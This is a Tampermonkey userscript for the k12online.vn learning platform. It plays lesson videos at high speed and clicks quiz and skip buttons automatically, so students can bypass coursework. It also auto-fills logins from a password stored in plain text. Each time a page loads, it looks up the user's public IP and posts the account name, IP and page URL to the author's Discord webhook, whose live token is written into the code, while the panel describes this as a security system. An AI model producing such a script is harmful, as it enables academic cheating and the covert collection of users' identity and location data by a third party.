// ==UserScript==
// @name         K12 Helper Pro - Danhvux (Full 4 Tabs - IP Check - Webhook)
// @namespace    http://tampermonkey.net/
// @version      29.0
// @description  Bypass SecurityError, Check K12 User & IP, Discord Webhook, Full 4 Tabs
// @author       Danhvux
// @match        *://*.k12online.vn/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // === CẤU HÌNH DISCORD WEBHOOK ===
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1489992801323061308/ywv0-FtallMzCjhG-a-yZXof4nyDpIewAem-4NrXn0mUBRinjBoV4kVSiO1QbSJMiUqw'; 

    let config = JSON.parse(localStorage.getItem('k12_ult_cfg')) || {
        mainColor: '#ffea00', width: 320, speed: 1, user: '', pass: '', isDarkMode: true, toastPos: 'top-right'
    };
    const save = () => localStorage.setItem('k12_ult_cfg', JSON.stringify(config));

    // --- HÀM LẤY USER K12 ---
    const getK12User = () => {
        const nameEl = document.querySelector('.user-name, .profile-name, .name-user, #user-info, .username');
        return (nameEl && nameEl.innerText.trim()) ? nameEl.innerText.trim() : (config.user || "Khách");
    };

    // --- HÀM LẤY IP VÀ GỬI LOG ---
    const startSecuritySystem = async () => {
        let userIP = "Không xác định";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            userIP = data.ip;
        } catch (e) { console.warn("Không thể lấy IP"); }

        const userName = getK12User();
        
        // Gửi Log qua Discord
        if (DISCORD_WEBHOOK && !DISCORD_WEBHOOK.includes('URL_WEBHOOK')) {
            const payload = {
                embeds: [{
                    title: "🛡️ K12 HELPER - SESSION START",
                    color: 16771840,
                    fields: [
                        { name: "👤 Tài khoản", value: `**${userName}**`, inline: true },
                        { name: "🌐 Địa chỉ IP", value: `**${userIP}**`, inline: true },
                        { name: "📍 Trang", value: window.location.href, inline: false },
                        { name: "🚀 Tốc độ", value: `x${config.speed}`, inline: true }
                    ],
                    footer: { text: "Danhvux Security • " + new Date().toLocaleString() }
                }]
            };
            fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).catch(()=>{});
        }
        return userIP;
    };

    // --- LOGIC GỐC: BYPASS & TURBO ---
    const runTurbo = () => {
        const v = document.querySelector('video');
        if (v && config.speed > 1) {
            v.playbackRate = parseFloat(config.speed);
            if (v.paused && !v.ended) v.play();
        }
        document.querySelectorAll('.vjs-skip-question, .btn-confirm, .btn-next-question, .vjs-done-button, .btn-confirm-answer').forEach(btn => btn.click());
    };
    setInterval(runTurbo, 1000);

    // --- KHỞI TẠO PANEL ---
    const initPanel = async () => {
        const userIP = await startSecuritySystem();
        const currentUser = getK12User();

        const host = document.createElement('div');
        host.id = 'dv-helper-root';
        document.body.appendChild(host);
        const shadow = host.attachShadow({mode: 'open'});

        const isDark = config.isDarkMode;
        const style = document.createElement('style');
        style.textContent = `
            :host { --mc: ${config.mainColor}; --w: ${config.width}px; --bg: ${isDark ? '#1e2227' : '#ffffff'}; --bg-tab: ${isDark ? '#1a1d21' : '#f0f0f0'}; --bg-input: ${isDark ? '#252a31' : '#f9f9f9'}; --text: ${isDark ? '#ffffff' : '#1e2227'}; --text-sec: ${isDark ? '#777' : '#999'}; --border: ${isDark ? '#333' : '#ddd'}; --shadow: ${isDark ? 'rgba(0,0,0,0.6)' : 'rgba(0,0,0,0.1)'}; }
            #dv-panel { position: fixed; top: 50px; right: 20px; width: var(--w); background: var(--bg); color: var(--text); border-radius: 12px; font-family: 'Segoe UI', sans-serif; z-index: 100000; box-shadow: 0 10px 40px var(--shadow); overflow: hidden; border: 1px solid var(--border); }
            .header { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid var(--border); } .header .title { color: var(--mc); font-weight: bold; font-size: 18px; }
            .dots { display: flex; gap: 8px; } .dot { height: 12px; width: 12px; border-radius: 50%; cursor: pointer; } .red { background: #ff5f56; }
            .tabs { display: flex; background: var(--bg-tab); padding: 0 5px; border-bottom: 1px solid var(--border); justify-content: space-around; }
            .tab { padding: 12px 10px; cursor: pointer; font-size: 10px; color: var(--text-sec); font-weight: 900; position: relative; transition: 0.3s; }
            .tab.active { color: var(--mc); } .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10px; right: 10px; height: 3px; background: var(--mc); border-radius: 3px 3px 0 0; }
            .content { display: none; padding: 20px; box-sizing: border-box; } .content.active { display: block; }
            .row-speed { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
            .val-right { color: var(--mc); font-weight: bold; font-size: 16px; }
            .slider { width: 100%; height: 5px; background: var(--border); border-radius: 5px; appearance: none; margin: 10px 0 25px 0; outline: none; }
            .slider::-webkit-slider-thumb { appearance: none; width: 16px; height: 16px; background: var(--mc); border-radius: 50%; cursor: pointer; }
            .video-placeholder { width: 100%; height: 100px; background: #000; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #444; font-size: 11px; margin-bottom: 15px; border: 1px dashed #333; text-align: center; }
            .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
            .app-item { background: var(--bg-input); padding: 10px 5px; border-radius: 10px; cursor: pointer; border: 1px solid var(--border); text-align: center; font-size: 11px; }
            input[type=text], input[type=password] { width: 100%; padding: 10px; background: var(--bg-input); border: 1px solid var(--border); color: var(--text); border-radius: 8px; margin-bottom: 10px; box-sizing: border-box; }
            .btn { width: 100%; padding: 12px; background: #b8cc8e; border: none; border-radius: 10px; color: #000; font-weight: bold; cursor: pointer; }
            .footer { text-align: center; font-size: 8px; color: var(--text-sec); padding: 10px; border-top: 1px solid var(--border); line-height: 1.4; }
        `;

        const panel = document.createElement('div');
        panel.id = 'dv-panel';
        panel.innerHTML = `
            <div class="header">
                <div class="title">Danhvux Panel</div>
                <div class="dots"><div class="dot red"></div></div>
            </div>
            <div class="tabs">
                <div class="tab active" data-t="t-main">MAIN</div>
                <div class="tab" data-t="t-video">VIDEO</div>
                <div class="tab" data-t="t-apps">APPS</div>
                <div class="tab" data-t="t-set">SETTINGS</div>
            </div>
            <div class="body-container">
                <div id="t-main" class="content active">
                    <div class="row-speed"><b>Tốc độ</b><span class="val-right">x<span id="sp-txt">${config.speed}</span></span></div>
                    <input type="range" id="sp-range" class="slider" min="1" max="20" step="0.5" value="${config.speed}">
                    <button class="btn" id="do-login">🪄 AUTO LOGIN</button>
                </div>
                <div id="t-video" class="content">
                    <div class="video-placeholder" id="v-display">Click PHÁT để đổi link video gốc</div>
                    <input type="text" id="v-url" placeholder="Link .mp4...">
                    <button class="btn" id="v-run" style="background:#444; color:#fff">PHÁT VIDEO</button>
                </div>
                <div id="t-apps" class="content">
                    <div class="app-grid">
                        <div class="app-item" data-url="https://gemini.google.com">Gemini</div>
                        <div class="app-item" data-url="https://chatgpt.com">ChatGPT</div>
                        <div class="app-item" data-url="https://facebook.com">Facebook</div>
                        <div class="app-item" data-url="https://youtube.com">YouTube</div>
                        <div class="app-item" data-url="https://tiktok.com">TikTok</div>
                        <div class="app-item" data-url="https://messenger.com">Chat</div>
                    </div>
                </div>
                <div id="t-set" class="content">
                    <input type="color" id="c-pick" style="width:100%; height:30px; border:none;" value="${config.mainColor}">
                    <input type="text" id="u-val" placeholder="Username..." value="${config.user}">
                    <input type="password" id="p-val" placeholder="Password..." value="${config.pass}">
                    <button class="btn" id="btn-save" style="background:var(--mc)">LƯU & RELOAD</button>
                </div>
            </div>
            <div class="footer">
                USER: ${currentUser}<br>
                IP: ${userIP}<br>
                DANHVUX HELPER PRO
            </div>
        `;

        shadow.appendChild(style);
        shadow.appendChild(panel);

        const $ = (id) => shadow.querySelector(id);
        
        // Tab switching
        shadow.querySelectorAll('.tab').forEach(tab => {
            tab.onclick = () => {
                shadow.querySelectorAll('.tab, .content').forEach(el => el.classList.remove('active'));
                tab.classList.add('active');
                shadow.querySelector(`#${tab.dataset.t}`).classList.add('active');
            };
        });

        shadow.querySelectorAll('.app-item').forEach(item => {
            item.onclick = () => window.open(item.dataset.url, '_blank');
        });

        $('#sp-range').oninput = (e) => { $('#sp-txt').innerText = e.target.value; config.speed = e.target.value; runTurbo(); };
        $('#btn-save').onclick = () => { config.mainColor = $('#c-pick').value; config.user = $('#u-val').value; config.pass = $('#p-val').value; save(); location.reload(); };
        
        $('#v-run').onclick = () => { 
            const v = document.querySelector('video'); 
            if (v && $('#v-url').value) { v.src = $('#v-url').value; v.play(); $('#v-display').innerText = "Đang phát video tùy chỉnh..."; } 
        };

        $('#do-login').onclick = () => {
            const u = document.querySelector('input[name="username"]'), p = document.querySelector('input[name="password"]');
            if(u && p) { 
                u.value = config.user; p.value = config.pass; 
                u.dispatchEvent(new Event('input',{bubbles:true})); p.dispatchEvent(new Event('input',{bubbles:true})); 
                setTimeout(()=>document.querySelector('button[type="submit"]').click(), 500); 
            }
        };

        // Kéo thả & Phím tắt
        let isDrag = false, off = [0,0];
        shadow.querySelector('.header').onmousedown = (e) => { isDrag = true; off = [panel.offsetLeft - e.clientX, panel.offsetTop - e.clientY]; };
        document.addEventListener('mousemove', (e) => { if(isDrag) { panel.style.left = (e.clientX + off[0]) + 'px'; panel.style.top = (e.clientY + off[1]) + 'px'; panel.style.right = 'auto'; } });
        document.addEventListener('mouseup', () => isDrag = false);
        shadow.querySelector('.red').onclick = () => panel.style.display = 'none';
        document.addEventListener('keydown', (e) => { if(e.key === 'F2') panel.style.display = (panel.style.display==='none'?'block':'none'); });
    };

    if (document.readyState === 'complete') initPanel(); else window.addEventListener('load', initPanel);
})();
